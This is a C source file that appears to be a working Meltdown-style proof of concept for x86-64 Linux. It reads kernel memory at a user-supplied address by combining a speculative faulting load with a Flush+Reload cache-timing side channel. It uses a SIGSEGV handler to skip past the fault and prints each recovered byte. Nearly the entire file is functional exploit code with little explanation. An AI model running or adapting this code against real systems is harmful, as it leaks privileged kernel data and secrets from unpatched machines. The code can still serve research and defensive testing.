#if !(defined(__x86_64__))
# error "Only x86-64 is supported at the moment"
#endif

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>

#define PAGE_SIZE	(1024 * 4)
#define PAGE_NUM	256
#define PROBE_TIMES 1000

static char probe_pages[PAGE_NUM * PAGE_SIZE];
static int cache_hit_threshold, cache_hit_times[PAGE_NUM];

static inline int get_access_delay(volatile char *addr)
{
    unsigned long long time1, time2;
    unsigned junk;
    time1 = __rdtscp(&junk);
    (void)*addr;
    time2 = __rdtscp(&junk);
    return time2 - time1;
}

static void clflush_probe_array(void)
{
	for (int i = 0; i < PAGE_NUM; i++)
		_mm_clflush(&probe_pages[i * PAGE_SIZE]);
}

static void i_will_access_kernel_address()//read linux_proc_banner by system call
{
    static char buf[256];
    int fd = open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return;
	}
    
    if (pread(fd, buf, sizeof(buf), 0) < 0)
        perror("pread");
    
    close(fd);
}

extern char stop_probe[];
static void __attribute__((noinline)) probe(unsigned long addr)
{
    //make kernel data(linux_proc_banner) in cache.
    i_will_access_kernel_address();
    
	asm volatile (
		"1:\n\t"

		".rept 300\n\t" //make the code below executed at same time.
		"add $0x14, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"    //make exception: eax = *addr
		"shl $12, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[probe_pages], %%rax, 1), %%rbx\n"  //move probe_pages to cache: rbx = [probe_pages + 4096 * (*addr)]

		"stop_probe: \n\t"
		"nop\n\t"
		:
		: [probe_pages] "r" (probe_pages),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}

static void update_cache_hit_times(void)
{
	int i, delay, page_index;
	volatile char *addr;

	for (i = 0; i < PAGE_NUM; i++) {
		page_index = ((i * 167) + 13) & 255; //page_index = i: maybe move probe_pages all in cache
        
		addr = &probe_pages[page_index * PAGE_SIZE];
		delay = get_access_delay(addr);

		if (delay <= cache_hit_threshold)
			cache_hit_times[page_index]++;
	}
}

static void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop_probe;
}

static int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

static int read_byte_from_cache(unsigned long addr)
{
	int i, max = -1, index_of_max = -1;
	memset(cache_hit_times, 0, sizeof(cache_hit_times)); 
    
	for (i = 0; i < PROBE_TIMES; i++) {
		clflush_probe_array();
		_mm_mfence();

		probe(addr);
		update_cache_hit_times();
	}

    //find the page which has highest access speed.
	for (i = 1; i < PAGE_NUM; i++) {
		if (!isprint(i))
			continue;
		if (cache_hit_times[i] && cache_hit_times[i] > max) {
			max = cache_hit_times[i];
			index_of_max = i;
		}
	}
	return index_of_max;//index_of_max = *addr
}

static void set_cache_hit_threshold(void)
{    
	long cached, uncached, i;
    const int ESTIMATE_CYCLES = 1000000;
    // move probe_pages to cache.
    memset(probe_pages, 1, sizeof(probe_pages));

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_delay(probe_pages);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(probe_pages);
		uncached += get_access_delay(probe_pages);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;
	cache_hit_threshold = cached * 2;
	printf("cached = %ld, uncached = %ld, threshold %d\n\n",
	       cached, uncached, cache_hit_threshold);
}

static void pin_cpu0()
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

int main(int argc, char *argv[])
{
	unsigned long kernel_addr, size;
	sscanf(argv[1], "%lx", &kernel_addr);
	sscanf(argv[2], "%lx", &size);

	set_signal();
	pin_cpu0();
	set_cache_hit_threshold();

	for (int i = 0; i < size; i++) {
		int ret = read_byte_from_cache(kernel_addr);
		if (ret == -1)
			ret = 0xff;
		printf("read %lx = %x %c (score=%d/%d)\n",
		       kernel_addr, ret, isprint(ret) ? ret : ' ',
		       ret != 0xff ? cache_hit_times[ret] : 0,
		       PROBE_TIMES);
		kernel_addr++;
	}
}
